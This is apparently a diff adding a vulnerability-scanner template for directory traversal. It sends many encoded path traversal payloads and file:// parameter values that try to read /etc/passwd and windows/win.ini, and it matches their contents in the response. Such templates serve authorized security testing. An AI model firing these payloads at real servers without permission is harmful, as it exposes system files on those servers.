@@ -1,0 +1,43 @@
+id: traversal-fuzzer
+
+info:
+  name: Directory Traversal
+  author: erickfernandox
+  severity: high
+  tags: cve,traversal
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/.../.../.../.../.../.../.../.../.../windows/win.ini"
+      - "{{BaseURL}}/.../.../.../.../.../.../.../.../.../etc/passwd"
+      - "{{BaseURL}}/../../../../../../../../../windows/win.ini"
+      - "{{BaseURL}}/../../../../../../../../../etc/passwd"      
+      - "{{BaseURL}}?file=/../../../../../../../../../etc/passwd&url=/../../../../../../../../../etc/passwd"
+      - "{{BaseURL}}?file=/../../../../../../../../../windows/win.ini&url=/../../../../../../../../../windows/win.ini"
+      - "{{BaseURL}}?file=file:///etc/passwd&url=file:///etc/passwd"      
+      - "{{BaseURL}}?file=file:///windows/win.ini&url=file:///windows/win.ini"            
+      - "{{BaseURL}}/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini"
+      - "{{BaseURL}}/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+      - "{{BaseURL}}/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fwindows%2fwin.ini"
+      - "{{BaseURL}}/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"            
+      - "{{BaseURL}}/.../.../.../.../.../.../.../.../.../windows/win.ini%00"
+      - "{{BaseURL}}/.../.../.../.../.../.../.../.../.../etc/passwd%00"      
+      - "{{BaseURL}}/../../../../../../../../../windows/win.ini%00"
+      - "{{BaseURL}}/../../../../../../../../../etc/passwd%00"
+      - "{{BaseURL}}/..;/..;/..;/..;/..;/..;/..;/..;/..;/windows/win.ini"
+      - "{{BaseURL}}/..;/..;/..;/..;/..;/..;/..;/..;/..;/etc/passwd"         
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: regex
+        part: body
+        regex:
+          - "root:[x*]:0:0:"
+          - "\\[(font|extension|file)s\\]"
+
+        conditon: or
